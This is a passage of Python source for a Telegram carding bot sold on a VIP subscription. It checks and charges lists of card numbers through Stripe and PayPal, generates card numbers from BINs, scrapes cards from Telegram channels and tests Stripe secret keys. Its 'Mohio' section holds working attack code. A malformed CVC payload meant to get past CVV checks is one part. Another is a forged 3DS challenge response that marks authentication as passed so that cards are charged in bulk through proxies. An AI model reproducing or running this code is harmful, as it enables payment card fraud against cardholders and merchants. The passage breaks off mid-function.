        "└──────────────────────────────\n"
    )


def _build_help_msg2(name, is_vip, BL, current_amount, admin_section):
    """Page 2 — SK tools, Gen, Proxy, Settings, Data."""
    lock = "✅" if is_vip else "🔒"

    return (
        # ── SK Checkers ─────────────────────────────────────────────────
        f"🗝️ <b>SK TOOLS</b>  [{lock} VIP]\n"
        "┌──────────────────────────────\n"
        "│ <code>.skchk</code> sk_live_xxx         →  Inspect SK key\n"
        "│ <code>.msk</code>   sk1↵sk2↵...         →  Test up to 30 SK keys\n"
        "└──────────────────────────────\n\n"

        # ── Gen & Tools ─────────────────────────────────────────────────
        "🎰 <b>GEN &amp; TOOLS</b>\n"
        "┌──────────────────────────────\n"
        "│ <code>.gen</code>    411111 50   →  Generate Luhn-valid cards\n"
        "│ <code>.gc</code>     411111 20   →  Gen + auto-check (chkr.cc)\n"
        "│ <code>.extrap</code> 411111 50   →  Extrapolate from BIN\n"
        "│ <code>.bin</code>    411111      →  BIN info (brand · bank · country)\n"
        "│ <code>.sq</code>                →  CC formatter\n"
        "│ <code>.merge</code>             →  Combine hit lists\n"
        "│ <code>.myid</code>              →  Get your Telegram ID\n"
        "└──────────────────────────────\n\n"

        # ── Proxy ───────────────────────────────────────────────────────
        "🕷️ <b>PROXY</b>\n"
        "┌──────────────────────────────\n"
        "│ <code>.setproxy</code> ip:port  →  Set personal proxy\n"
        "│ <code>.addproxy</code> ip:port  ·  <code>.removeproxy</code>\n"
        "│ <code>.proxycheck</code>        →  Test current proxy\n"
        "│ <code>.chkpxy</code>            →  Bulk proxy tester\n"
        "│ <code>.pscr</code>              →  🕷️ Scrape fresh proxies (7 sources)\n"
        "│ <code>.pscr socks5</code>      →  Filter SOCKS5 proxies\n"
        "│ <code>.scr t.me/ch 50</code>  →  🃏 Scrape CCs from TG channel\n"
        "└──────────────────────────────\n\n"

        # ── Settings ────────────────────────────────────────────────────
        "⚙️ <b>SETTINGS</b>\n"
        "┌──────────────────────────────\n"
        f"│ <code>.setamount</code> 2   →  Charge amount (now <code>${current_amount}</code>)\n"
        "│ <code>.setsk</code> sk_live_xxx  ·  <code>.mysk</code>  ·  <code>.delsk</code>\n"
        "│ <code>.ping</code>           →  Bot latency check\n"
        "└──────────────────────────────\n\n"

        # ── Data & History ──────────────────────────────────────────────
        "📊 <b>DATA &amp; HISTORY</b>\n"
        "┌──────────────────────────────\n"
        "│ <code>.history</code>   ·  <code>.dbstats</code>   ·  <code>.dbsearch</code>\n"
        "│ <code>.dbexport</code>  ·  <code>.dbbackup</code>\n"
        "└──────────────────────────────\n\n"

        # ── Admin ───────────────────────────────────────────────────────
        + admin_section +

        # ── Tips ────────────────────────────────────────────────────────
        "💡 <b>QUICK TIPS</b>\n"
        "┌──────────────────────────────\n"
        "│ · Reply to any card list → command auto-reads it\n"
        "│ · <code>.sco</code> reply to /chkm hits → runs thru SCO\n"
        "│ · Cards: <code>NUM|MM|YY|CVV</code> format required\n"
        "│ · Use <code>.stop</code> anytime to cancel mass check\n"
        "└──────────────────────────────\n"
        "⌤ <b>Dev by @yadistan</b> 🍀  ·  <i>Total: 44+ commands</i>"
    )


@bot.message_handler(commands=["cmds", "help"])
def cmds_command(message):
    json_data = _load_data()
    uid = message.from_user.id
    try:
        BL = json_data[str(uid)]['plan']
    except Exception:
        BL = '𝗙𝗥𝗘𝗘'
    name           = message.from_user.first_name or "User"
    current_amount = get_user_amount(uid)
    is_vip         = BL != '𝗙𝗥𝗘𝗘'

    keyboard = types.InlineKeyboardMarkup(row_width=2)
    keyboard.add(
        types.InlineKeyboardButton(text="⭐ VIP Active ✅" if is_vip else "🚀 Get VIP", callback_data='plan'),
        types.InlineKeyboardButton(text="💬 Support", url="https://t.me/yadistan")
    )
    keyboard.add(
        types.InlineKeyboardButton(text="⚡ Ping", callback_data='ping_inline'),
        types.InlineKeyboardButton(text="📊 My Stats", callback_data='stats_inline')
    )

    admin_section = ""
    if uid == admin:
        admin_section = (
            "🛡️ <b>ADMIN</b>\n"
            "┌──────────────────────────────\n"
            "│ <code>/addvip</code> id [days]  ·  <code>/removevip</code>  ·  <code>/viplist</code>\n"
            "│ <code>/checkvip</code>  ·  <code>/code</code> hours  ·  <code>/status</code>\n"
            "│ <code>/stats</code>  ·  <code>/logs</code>  ·  <code>/shell</code>\n"
            "│ <code>/addbandc</code> email:pass  ·  <code>/listbandc</code>  ·  <code>/clearbandc</code>\n"
            "│ <code>.send</code>  →  Broadcast to all VIPs\n"
            "└──────────────────────────────\n\n"
        )

    page1 = _build_help_msg1(name, is_vip, BL, current_amount)
    page2 = _build_help_msg2(name, is_vip, BL, current_amount, admin_section)
    full_help = page1 + "\n" + page2

    # Split only if combined message exceeds Telegram's 4096-char limit
    def _send_help(text, reply_markup=None):
        """Send with 429 retry back-off."""
        for _attempt in range(3):
            try:
                bot.send_message(chat_id=message.chat.id, text=text,
                                 parse_mode='HTML', reply_markup=reply_markup,
                                 disable_web_page_preview=True)
                return
            except Exception as _e:
                err_str = str(_e)
                if '429' in err_str:
                    import re as _re
                    _m = _re.search(r'retry after (\d+)', err_str)
                    _wait = int(_m.group(1)) if _m else 10
                    time.sleep(min(_wait, 30))
                else:
                    raise

    try:
        if len(full_help) <= 4000:
            # One message — half the API calls
            _send_help(full_help, reply_markup=keyboard)
        else:
            # Fallback: two messages only if truly over limit
            _send_help(page1)
            time.sleep(0.5)
            _send_help(page2, reply_markup=keyboard)
    except Exception as _e:
        try:
            bot.send_message(chat_id=message.chat.id, text=f"❌ Help error: {_e}")
        except Exception:
            pass


# ═══════════════════════════════════════════════════════════════════════════
# MOHIO STRIPE INTEGRATION
# Source: github.com/Ml0dyR/Stripe-Hitter-Mohio
# Extracted: BIN generator · CVV bypass payload · 3DS CRes auto-forge
# Architecture: pure direct API (no browser / proxy server required)
# ═══════════════════════════════════════════════════════════════════════════
import urllib.parse as _uparse_m

# Mohio CVV bypass payload — malformed nested array confuses CVC validation
_MOHIO_CVV_TRASH = '[' * 512 + '[]' + ']' * 512


def _mohio_gencc(pattern: str):
    """BIN-pattern Luhn-valid card generator with 'x' wildcards.
    Returns 'num|mm|yy|cvv' string or None after 50k attempts.
    Adapted from Mohio gencc() — supports variable-length BIN patterns.
    """
    import random, datetime as _dt
    pat = pattern.strip().lower()
    while len(pat) < 16:
        pat += 'x'
    pat = pat[:16]

    def _luhn(s):
        d = [int(c) for c in s]
        for i in range(len(d) - 2, -1, -2):
            d[i] *= 2
            if d[i] > 9:
                d[i] -= 9
        return sum(d) % 10

    yr = _dt.date.today().year
    for _ in range(50000):
        num = ''.join(str(random.randint(0, 9)) if c == 'x' else c for c in pat)
        if _luhn(num) == 0:
            mm  = str(random.randint(1, 12)).zfill(2)
            yy  = str(random.randint(yr + 1, yr + 7))[-2:]
            cvv = str(random.randint(100, 999))
            return f"{num}|{mm}|{yy}|{cvv}"
    return None


def _mohio_tokenize(n, mm, yy, pk, proxy_dict=None, cvv_bypass=False):
    """Tokenize card via api.stripe.com/v1/payment_methods.
    cvv_bypass=True → send Mohio malformed CVC payload to bypass CVV check.
    Returns pm_id string or None on failure.
    """
    import requests as _rq
    s = _rq.Session()
    if proxy_dict:
        s.proxies.update(proxy_dict)
    cvc_raw = _MOHIO_CVV_TRASH if cvv_bypass else '000'
    payload = (
        f'type=card&card[number]={n}&card[exp_month]={mm}'
        f'&card[exp_year]={yy}'
        f'&card[cvc]={_uparse_m.quote_plus(cvc_raw)}'
        f'&payment_user_agent=stripe.js%2F90ba939846%3B+checkout'
    )
    try:
        r = s.post(
            'https://api.stripe.com/v1/payment_methods',
            headers={
                'Authorization': f'Bearer {pk}',
                'Content-Type': 'application/x-www-form-urlencoded',
                'User-Agent': 'stripe.js/90ba939846; stripe-js-v3/90ba939846; checkout',
            },
            data=payload, timeout=12
        )
        return r.json().get('id')
    except Exception:
        return None


def _mohio_3ds_authenticate(pk, source_id, proxy_dict=None):
    """Call api.stripe.com/v1/3ds2/authenticate to retrieve ares transaction IDs.
    Returns parsed JSON dict or None.
    """
    import requests as _rq
    s = _rq.Session()
    if proxy_dict:
        s.proxies.update(proxy_dict)
    payload = (
        f'source={_uparse_m.quote_plus(source_id)}'
        f'&browser[java_enabled]=false&browser[language]=en-US'
        f'&browser[color_depth]=24&browser[screen_width]=1920'
        f'&browser[screen_height]=1080&browser[timezone]=-120'
        f'&browser[user_agent]={_uparse_m.quote_plus("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36")}'
        f'&one_click_authn_device_support[hosted]=false'
        f'&one_click_authn_device_support[same_origin_frame]=false'
        f'&one_click_authn_device_support[spc_eligible]=false'
        f'&one_click_authn_device_support[webauthn_eligible]=false'
        f'&one_click_authn_device_support[publickey_credentials_get_allowed]=false'
    )
    try:
        r = s.post(
            'https://api.stripe.com/v1/3ds2/authenticate',
            headers={
                'Authorization': f'Bearer {pk}',
                'Content-Type': 'application/x-www-form-urlencoded',
                'User-Agent': 'stripe.js/90ba939846; stripe-js-v3/90ba939846',
            },
            data=payload, timeout=12
        )
        return r.json()
    except Exception:
        return None


def _mohio_forge_cres(pk, client_secret, srv_trans_id, acs_trans_id, proxy_dict=None):
    """Forge a Stripe CRes with transStatus='Y' → POST to 3ds2/challenge_complete.
    This is the core Mohio 3DS bypass technique.
    Returns response JSON or None.
    """
    import requests as _rq, json as _js
    cres = _js.dumps({
        "messageType":         "CRes",
        "messageVersion":      "2.1.0",
        "threeDSServerTransID": srv_trans_id,
        "acsTransID":           acs_trans_id,
        "transStatus":          "Y",
    }, separators=(',', ':'))
    s = _rq.Session()
    if proxy_dict:
        s.proxies.update(proxy_dict)
    try:
        r = s.post(
            'https://api.stripe.com/v1/3ds2/challenge_complete',
            headers={
                'Authorization': f'Bearer {pk}',
                'Content-Type': 'application/x-www-form-urlencoded',
                'User-Agent': 'stripe.js/90ba939846; stripe-js-v3/90ba939846',
            },
            data=(
                f'client_secret={_uparse_m.quote_plus(client_secret)}'
                f'&final_cres={_uparse_m.quote_plus(cres)}'
            ),
            timeout=12
        )
        return r.json()
    except Exception:
        return None


def _mohio_full_charge(cc, sk, pk, proxy_dict=None, amount_cents=50, currency='usd'):
    """Mohio-enhanced full Stripe charge with 3DS auto-bypass pipeline:
      1. Tokenize card (normal) → fallback with CVV bypass payload
      2. Create + Confirm PaymentIntent
      3. If requires_action → 3ds2/authenticate → forge CRes (transStatus=Y)
         → 3ds2/challenge_complete → re-confirm PaymentIntent
    Returns (status_str, detail_str).
    """
    import requests as _rq
    parsed = _parse_card(cc)
    if not parsed:
        return "Error", "Invalid card format"
    n, mm, yy, _cvc = parsed

    s = _rq.Session()
    if proxy_dict:
        s.proxies.update(proxy_dict)

    # ── Step 1: Tokenize (normal, then CVV-bypass fallback) ─────────────────
    pm_id = _mohio_tokenize(n, mm, yy, pk, proxy_dict, cvv_bypass=False)
    if not pm_id:
        pm_id = _mohio_tokenize(n, mm, yy, pk, proxy_dict, cvv_bypass=True)
    if not pm_id:
        return "Error", "Tokenization failed — check PK key"

    # ── Step 2: Create + Confirm PaymentIntent ──────────────────────────────
    try:
        r = s.post(
            'https://api.stripe.com/v1/payment_intents',
            headers={
                'Authorization': f'Bearer {sk}',
                'Content-Type': 'application/x-www-form-urlencoded',
            },
            data=(
                f'amount={amount_cents}&currency={currency}'
                f'&payment_method={pm_id}'
                f'&confirm=true'
                f'&payment_method_types[]=card'
                f'&return_url=https://stripe.com'
            ),
            timeout=20
        )
        pi = r.json()
    except Exception as e:
        return "Error", f"PI request failed: {str(e)[:40]}"

    status = pi.get('status', '')
    err    = pi.get('last_payment_error', pi.get('error', {}))

    if status == 'succeeded':
        return "Approved", f"Charged ${amount_cents/100:.2f} ✅"

    if status == 'requires_action':
        # ── Step 3: 3DS auto-bypass ──────────────────────────────────────────
        na        = pi.get('next_action', {})
        sdk       = na.get('use_stripe_sdk', {})
        source_id = sdk.get('stripe_js', '') or sdk.get('source', '')
        client_secret = pi.get('client_secret', '')
        pi_id         = pi.get('id', '')

        auth_resp = _mohio_3ds_authenticate(pk, source_id, proxy_dict) if source_id else None

        if auth_resp:
            ares   = auth_resp.get('ares', {})
            ts     = ares.get('transStatus', '')
            srv_id = ares.get('threeDSServerTransID', '')
            acs_id = ares.get('acsTransID', '')

            def _confirm_pi():
                try:
                    cr = s.post(
                        f'https://api.stripe.com/v1/payment_intents/{pi_id}/confirm',
                        headers={'Authorization': f'Bearer {sk}', 'Content-Type': 'application/x-www-form-urlencoded'},
                        data='return_url=https://stripe.com',
                        timeout=15
                    )
                    return cr.json()
                except Exception:
                    return {}

            if ts == 'Y':
                # Frictionless — no challenge needed, just confirm
                cd = _confirm_pi()
                if cd.get('status') == 'succeeded':
                    return "Approved", "3DS Frictionless ✅ Charged"
                return "3DS Frictionless", f"PI status: {cd.get('status', 'unknown')}"

            if ts in ('C', 'D') and srv_id and acs_id:
                # Challenge path → forge CRes with transStatus=Y
                forge_resp = _mohio_forge_cres(pk, client_secret, srv_id, acs_id, proxy_dict)
                if forge_resp and 'error' not in forge_resp:
                    cd = _confirm_pi()
                    if cd.get('status') == 'succeeded':
                        return "Approved", "3DS CRes Forged + Charged 🔥"
                    cd_err = cd.get('last_payment_error', {})
                    dc     = cd_err.get('decline_code') or cd_err.get('code', '')
                    return "3DS Attempted", f"CRes sent · PI: {cd.get('status','')} {dc}"
                return "3DS Required", "CRes forge rejected by bank"

            return "3DS Required", f"transStatus={ts} — no bypass path found"

        # No source_id or authenticate failed
        return "3DS Required", "authenticate endpoint unreachable"

    if status == 'requires_payment_method':
        dc  = err.get('decline_code') or err.get('code', 'declined')
        msg = err.get('message', '')
        return "Declined", f"{dc} — {msg[:50]}" if msg else str(dc)

    if 'error' in pi:
        e = pi['error']
        return "Error", e.get('message', str(e))[:80]

    return status.capitalize() or "Unknown", str(pi)[:100]


# ── /m3ds command — Mohio 3DS Auto-Bypass Checker ──────────────────────────

@bot.message_handler(commands=["m3ds"])
def m3ds_command(message):
    """Mohio 3DS Auto-Bypass.
    Usage: /m3ds sk_live_xxx pk_live_xxx card|mm|yy|cvv
    Multi: /m3ds sk_live_xxx pk_live_xxx  (then cards on new lines or reply)
    """
    def my_function():
        uid = message.from_user.id
        json_data = _load_data()
        try:
            BL = json_data[str(uid)]['plan']
        except Exception:
            BL = '𝗙𝗥𝗘𝗘'
        if BL == '𝗙𝗥𝗘𝗘' and uid != admin:
            bot.reply_to(message, "<b>❌ VIP only.</b>", parse_mode='HTML')
            return

        text       = message.text or ''
        reply_text = (message.reply_to_message.text or '') if message.reply_to_message else ''
        all_text   = text + '\n' + reply_text

        sk_m = re.search(r'sk_(?:live|test)_\S+', all_text)
        pk_m = re.search(r'pk_(?:live|test)_\S+', all_text)

        sk = sk_m.group(0) if sk_m else get_user_sk(uid)
        pk = pk_m.group(0) if pk_m else None

        if not sk or not pk:
            bot.reply_to(message,
                "<b>🔥 Mohio 3DS Auto-Bypass\n\n"
                "Usage (cards first, then keys):\n"
                "<code>/m3ds 4111|12|25|123 sk_live_xxx pk_live_xxx</code>\n\n"
                "Multi-card:\n"
                "<code>/m3ds\n"
                "4111|12|25|123\n"
                "5200|06|26|456\n"
                "sk_live_xxx pk_live_xxx</code>\n\n"
                "Or save SK with <code>/setsk sk_live_xxx</code> then:\n"
                "<code>/m3ds card pk_live_xxx</code></b>",
                parse_mode='HTML')
            return

        cards = _get_cards_from_message(message)
        cards = [c for c in cards if not c.startswith('sk_') and not c.startswith('pk_')]
        if not cards:
            bot.reply_to(message, "<b>❌ No valid cards found.</b>", parse_mode='HTML')
            return

        proxy = get_proxy_dict(uid)
        log_command(message, query_type='gateway', gateway='m3ds')

        # ── Single card ──────────────────────────────────────────────────────
        if len(cards) == 1:
            card = cards[0]
            msg  = bot.reply_to(message,
                "<b>🔥 Mohio 3DS Bypass ⏳\nTokenizing → PI → 3DS attempt...</b>",
                parse_mode='HTML')
            bin_info, bank, country, cc_code = get_bin_info(card[:6])
            t0 = time.time()
            status, detail = _mohio_full_charge(card, sk, pk, proxy, amount_cents=50)
            elapsed = time.time() - t0

            is_hit     = status == "Approved"
            is_bypass  = "Forged" in detail or "Frictionless" in detail
            emoji      = "✅" if is_hit else ("🔥" if is_bypass else ("⚠️" if "3DS" in status else "❌"))
            _top = ("✨ ✦ ─── A P P R O V E D ─── ✦ ✨" if is_hit
                    else "✨ ✦ ─── M O H I O   3 D S ─── ✦ ✨")
            _box = ("╔══════════════════════════╗\n║  ✅  3DS BYPASS — HIT !   ║\n╚══════════════════════════╝"
                    if is_hit else
                    "╔══════════════════════════╗\n║  🔥  3DS AUTO-BYPASS      ║\n╚══════════════════════════╝")
            _cc_show = cc_code if cc_code not in ('N/A', '??', '', 'Unknown') else ''
            kb = types.InlineKeyboardMarkup()
            kb.add(types.InlineKeyboardButton(text="@yadistan", url="https://t.me/yadistan"))
            bot.edit_message_text(
                chat_id=message.chat.id, message_id=msg.message_id,
                parse_mode='HTML', reply_markup=kb,
                text=(f"<b>{_top}\n{_box}\n│\n"
                      f"│ 💳 <code>{card}</code>\n"
                      f"│ 💬 {status}  —  {detail} {emoji}\n│\n"
                      f"│ 🏦 BIN: {bin_info}\n│ 🏛️ Bank: {bank}\n"
                      f"│ 🌍 Country: {country}{f' ({_cc_show})' if _cc_show else ''}\n│\n"
                      f"│ ⏱️ {elapsed:.2f}s\n└──────────────────────────\n"
                      f"       ⌤ Mohio 3DS / @yadistan</b>"))
            return

        # ── Mass mode ────────────────────────────────────────────────────────
        total = len(cards)
        if total > 100:
            bot.reply_to(message, "<b>❌ Max 100 cards per m3ds batch.</b>", parse_mode='HTML')
            return

        try:
            stopuser[f'{uid}']['status'] = 'start'
        except Exception:
            stopuser[f'{uid}'] = {'status': 'start'}
        stop_kb = types.InlineKeyboardMarkup()
        stop_kb.add(types.InlineKeyboardButton(text="🛑 Stop", callback_data='stop'))
        msg = bot.reply_to(message,
            f"<b>🔥 Mohio 3DS Mass Bypass\n"
            f"Cards: {total} · SK: <code>{sk[:14]}...***</code>\n⏳ Starting...</b>",
            reply_markup=stop_kb, parse_mode='HTML')

        live = 0; dead = 0; bypassed = 0; checked = 0
        results_lines = []; approved_hits = []
        lock = threading.Lock()
        _live_hit_holder = [None, []]

        def build_m3ds_msg(status_txt="⏳ Bypassing..."):
            h  = (f"<b>🔥 Mohio 3DS Mass Bypass\n{status_txt}\n"
                  f"━━━━━━━━━━━━━━━━━━━━\n"
                  f"📊 {checked}/{total}  ✅ {live}  🔥 {bypassed}  ❌ {dead}\n"
                  f"━━━━━━━━━━━━━━━━━━━━\n")
            return h + "\n".join(results_lines[-12:]) + "\n━━━━━━━━━━━━━━━━━━━━\n⌤ Mohio / @yadistan</b>"

        def _m3ds_one(cc):
            nonlocal live, dead, bypassed, checked
            if stopuser.get(f'{uid}', {}).get('status') == 'stop':
                return
            cc = cc.strip()
            st, det = _mohio_full_charge(cc, sk, pk, proxy, amount_cents=50)
            is_hit    = st == "Approved"
            is_bypass = "Forged" in det or "Frictionless" in det
            emoji     = "✅" if is_hit else ("🔥" if is_bypass else ("⚠️" if "3DS" in st else "❌"))
            with lock:
                checked += 1
                if is_hit:     live += 1; approved_hits.append(cc); _add_to_merge(uid, cc)
                elif is_bypass: bypassed += 1
                else:           dead += 1
                results_lines.append(f"{emoji} <code>{cc}</code>\n   ↳ {st} — {det[:35]}")
            if is_hit:
                _notify_live_hit(message.chat.id, cc, "m3ds", holder=_live_hit_holder)
            try:
                skb = types.InlineKeyboardMarkup()
                skb.add(types.InlineKeyboardButton(text="🛑 Stop", callback_data='stop'))
                bot.edit_message_text(chat_id=message.chat.id, message_id=msg.message_id,
                                      text=build_m3ds_msg(), parse_mode='HTML', reply_markup=skb)
            except Exception:
                pass

        from concurrent.futures import ThreadPoolExecutor, as_completed
        with ThreadPoolExecutor(max_workers=3) as pool:
            futures = {pool.submit(_m3ds_one, cc): cc for cc in cards}
            for fut in as_completed(futures):
                if stopuser.get(f'{uid}', {}).get('status') == 'stop':
                    pool.shutdown(wait=False); break
                try: fut.result()
                except Exception: pass

        stopped = stopuser.get(f'{uid}', {}).get('status') == 'stop'
        try:
            kb = types.InlineKeyboardMarkup()
            kb.add(types.InlineKeyboardButton(text="@yadistan", url="https://t.me/yadistan"))
            bot.edit_message_text(chat_id=message.chat.id, message_id=msg.message_id,
                text=build_m3ds_msg("🛑 STOPPED" if stopped else "✅ Complete!"),
                parse_mode='HTML', reply_markup=kb)
        except Exception:
            pass

        if approved_hits:
            try:
                hits_kb = types.InlineKeyboardMarkup(row_width=2)
                hits_kb.add(types.InlineKeyboardButton(text="💬 Support", url="https://t.me/yadistan"),
                            types.InlineKeyboardButton(text="🤖 ST-Checker", url="https://t.me/stcheckerbot"))
                bot.send_message(message.chat.id,
                    (f"<b>🔥 Mohio Hits [{len(approved_hits)}/{total}]\n"
                     f"╔══════════════════════════╗\n║  ✅  3DS BYPASS — HITS    ║\n"
                     f"╚══════════════════════════╝\n</b>"
                     f"<code>{chr(10).join(approved_hits)}</code>"),
                    parse_mode='HTML', reply_markup=hits_kb)
            except Exception:
                pass

    threading.Thread(target=my_function).start()


@bot.message_handler(commands=["pp"])
def paypal_command(message):
    def my_function():
        id = message.from_user.id
        with open("data.json", 'r', encoding='utf-8') as file:
            json_data = json.load(file)
        
        try:
            BL = json_data[str(id)]['plan']
        except:
            BL = '𝗙𝗥𝗘𝗘'
        
        if BL == '𝗙𝗥𝗘𝗘' and id != admin:
            bot.reply_to(message, "<b>❌ 𝗧𝗵𝗶𝘀 𝗰𝗼𝗺𝗺𝗮𝗻𝗱 𝗶𝘀 𝗼𝗻𝗹𝘆 𝗳𝗼𝗿 𝗩𝗜𝗣 𝘂𝘀𝗲𝗿𝘀.</b>")
            return

        allowed, wait = check_rate_limit(id, BL)
        if not allowed:
            bot.reply_to(message, f"<b>⏱️ 𝗪𝗮𝗶𝘁 {wait}𝘀 𝗯𝗲𝗳𝗼𝗿𝗲 𝗻𝗲𝘅𝘁 𝗰𝗵𝗲𝗰𝗸.</b>")
            return
        
        try:
            date_str = json_data[str(id)]['timer'].split('.')[0]
            provided_time = datetime.strptime(date_str, "%Y-%m-%d %H:%M")
            current_time = datetime.now()
            required_duration = timedelta(hours=0)
            if current_time - provided_time > required_duration:
                keyboard = types.InlineKeyboardMarkup()
                contact_button = types.InlineKeyboardButton(text="YADISTAN ", url="https://t.me/yadistan")
                keyboard.add(contact_button)
                bot.send_message(chat_id=message.chat.id, text='''<b>𝗬𝗼𝘂 𝗖𝗮𝗻𝗻𝗼𝘁 𝗨𝘀𝗲 𝗧𝗵𝗲 𝗕𝗼𝘁 𝗕𝗲𝗰𝗮𝘂𝘀𝗲 𝗬𝗼𝘂𝗿 𝗦𝘂𝗯𝘀𝗰𝗿𝗶𝗽𝘁𝗶𝗼𝗻 𝗛𝗮𝘀 𝗘𝘅𝗽𝗶𝗿𝗲𝗱</b>''', reply_markup=keyboard)
                json_data[str(id)]['timer'] = 'none'
                json_data[str(id)]['plan'] = '𝗙𝗥𝗘𝗘'
                with _DATA_LOCK:
                    with open("data.json", 'w', encoding='utf-8') as file:
                        json.dump(json_data, file, indent=2)
                return
        except:
            pass
        
        cards = _get_cards_from_message(message)
        if not cards:
            current_amount = get_user_amount(id)
            bot.reply_to(message, f"<b>𝗖𝗼𝗿𝗿𝗲𝗰𝘁 𝘂𝘀𝗮𝗴𝗲:\n/pp 4111111111111111|12|25|123\n\n💰 𝗖𝘂𝗿𝗿𝗲𝗻𝘁 𝗮𝗺𝗼𝘂𝗻𝘁: ${current_amount}\n\n<i>💡 Tip: Reply to .txt file or paste multiple cards</i></b>")
            return

        log_command(message, query_type='gateway', gateway='paypal')
        user_amount = get_user_amount(id)
        proxy = get_proxy_dict(id)

        # ── SINGLE CARD MODE ─────────────────────────────────────────────────
        if len(cards) == 1:
            card = cards[0]
            msg = bot.reply_to(message, f"<b>𝗖𝗵𝗲𝗰𝗸𝗶𝗻𝗴 𝗰𝗮𝗿𝗱... ⏳\n💰 𝗔𝗺𝗼𝘂𝗻𝘁: ${user_amount}</b>")
            bin_num = card[:6]
            bin_info, bank, country, country_code = get_bin_info(bin_num)
            start_time = time.time()
            result = paypal_gate(card, user_amount, proxy)
            execution_time = time.time() - start_time
            log_card_check(id, card, 'paypal', result, exec_time=execution_time)
            if "𝗔𝗽𝗽𝗿𝗼𝘃𝗲𝗱" in result:
                status_emoji = "✅"
            elif "𝗜𝗻𝘀𝘂𝗳𝗳𝗶𝗰𝗶𝗲𝗻𝘁 𝗙𝘂𝗻𝗱𝘀" in result:
                status_emoji = "💰"
            else:
                status_emoji = "❌"
            minux_keyboard = types.InlineKeyboardMarkup()
            minux_keyboard.add(types.InlineKeyboardButton(text="YADISTAN - 🍀", url="https://t.me/yadistan"))
            formatted_message = UI.fmt_single(
                "pp", card, status_emoji, result,
                gate_name="PayPal GiveWP + Stripe",
                bin_info=bin_info, bank=bank, country=country, country_code=country_code,
                elapsed=execution_time, amount=user_amount
            )
            bot.edit_message_text(
                chat_id=message.chat.id, message_id=msg.message_id,
                text=formatted_message, reply_markup=minux_keyboard,
                parse_mode='HTML', disable_web_page_preview=True
            )
            return

        # ── MASS MODE (multiple cards / .txt file) ───────────────────────────
        total = len(cards)
        try:
            stopuser[f'{id}']['status'] = 'start'
        except:
            stopuser[f'{id}'] = {'status': 'start'}
        stop_kb = types.InlineKeyboardMarkup()
        stop_kb.add(types.InlineKeyboardButton(text="🛑 𝗦𝘁𝗼𝗽", callback_data='stop'))
        msg = bot.reply_to(message,
            f"<b>💳 𝗣𝗮𝘆𝗣𝗮𝗹 𝗠𝗮𝘀𝘀 𝗖𝗵𝗲𝗰𝗸𝗲𝗿\n𝗧𝗼𝘁𝗮𝗹: {total} 𝗰𝗮𝗿𝗱𝘀 · 💰 ${user_amount}\n𝗦𝘁𝗮𝗿𝘁𝗶𝗻𝗴... ⏳</b>",
            reply_markup=stop_kb)
        approved = insuf = dead = checked = 0
        results_lines = []
        def _pp_build_msg(status="⏳ 𝗖𝗵𝗲𝗰𝗸𝗶𝗻𝗴..."):
            h = (
                f"<b>✨ ✦ ─── P P   M A S S ─── ✦ ✨\n"
                f"╔══════════════════════════╗\n"
                f"║  💳  PAYPAL MASS CHECKER  ║\n"
                f"╚══════════════════════════╝\n"
                f"│ {status}\n│\n"
                f"│ 💰 ${user_amount}  ·  📊 {checked}/{total}  ·  ✅ {approved}  ·  💰 {insuf}  ·  ❌ {dead}\n│\n"
            )
            body = "\n".join(results_lines[-15:])
            return h + body + f"\n└──────────────────────────\n       ⌤ Bot by @yadistan</b>"
        for cc in cards:
            if stopuser.get(f'{id}', {}).get('status') == 'stop':
                try:
                    bot.edit_message_text(chat_id=message.chat.id, message_id=msg.message_id,
                                          text=_pp_build_msg("🛑 𝗦𝗧𝗢𝗣𝗣𝗘𝗗"), parse_mode='HTML')
                except:
                    pass
                return
            result = paypal_gate(cc.strip(), user_amount, proxy)
            checked += 1
            if "𝗔𝗽𝗽𝗿𝗼𝘃𝗲𝗱" in result:
                status_emoji = "✅"; approved += 1
                _add_to_merge(id, cc)
                _notify_live_hit(message.chat.id, cc, "pp_mass")
            elif "𝗜𝗻𝘀𝘂𝗳𝗳𝗶𝗰𝗶𝗲𝗻𝘁 𝗙𝘂𝗻𝗱𝘀" in result:
                status_emoji = "💰"; insuf += 1
            else:
                status_emoji = "❌"; dead += 1
            log_card_check(id, cc, 'paypal_mass', result)
            results_lines.append(f"{status_emoji} <b>{result[:28]}</b>  ·  <code>{cc}</code>")
            try:
                skb = types.InlineKeyboardMarkup()
                skb.add(types.InlineKeyboardButton(text="🛑 𝗦𝘁𝗼𝗽", callback_data='stop'))
                bot.edit_message_text(chat_id=message.chat.id, message_id=msg.message_id,
                                      text=_pp_build_msg(), parse_mode='HTML', reply_markup=skb)
            except:
                pass
        try:
            kb = types.InlineKeyboardMarkup()
            kb.add(types.InlineKeyboardButton(text="@yadistan", url="https://t.me/yadistan"))
            bot.edit_message_text(chat_id=message.chat.id, message_id=msg.message_id,
                                  text=_pp_build_msg("✅ 𝗖𝗼𝗺𝗽𝗹𝗲𝘁𝗲𝗱!"), parse_mode='HTML', reply_markup=kb)
        except:
            pass

    my_thread = threading.Thread(target=my_function)
    my_thread.start()


# ================== /p — PayPal Charge API (ppcharge) ==================
_PPCHARGE_API = "https://ppcharge-api.melmelmel.workers.dev/"

def _ppcharge_call(card, proxy_raw=""):
    """Call the ppcharge Cloudflare Worker API. Returns (status, message)."""
    try:
        params = {"card": card.strip(), "proxy": proxy_raw or ""}
        r = requests.get(_PPCHARGE_API, params=params, timeout=20)
        data = r.json()
        return data.get("status", "ERROR"), data.get("message", "Unknown error")
    except requests.exceptions.Timeout:
        return "ERROR", "Timeout"
    except Exception as e:
        return "ERROR", str(e)[:60]

@bot.message_handler(commands=["p"])
def p_ppcharge_command(message):
    def my_function():
        id = message.from_user.id
        with open("data.json", 'r', encoding='utf-8') as file:
            json_data = json.load(file)

        try:
            BL = json_data[str(id)]['plan']
        except Exception:
            BL = '𝗙𝗥𝗘𝗘'

        if BL == '𝗙𝗥𝗘𝗘' and id != admin:
            bot.reply_to(message, "<b>❌ 𝗧𝗵𝗶𝘀 𝗰𝗼𝗺𝗺𝗮𝗻𝗱 𝗶𝘀 𝗼𝗻𝗹𝘆 𝗳𝗼𝗿 𝗩𝗜𝗣 𝘂𝘀𝗲𝗿𝘀.</b>", parse_mode='HTML')
            return

        allowed, wait = check_rate_limit(id, BL)
        if not allowed:
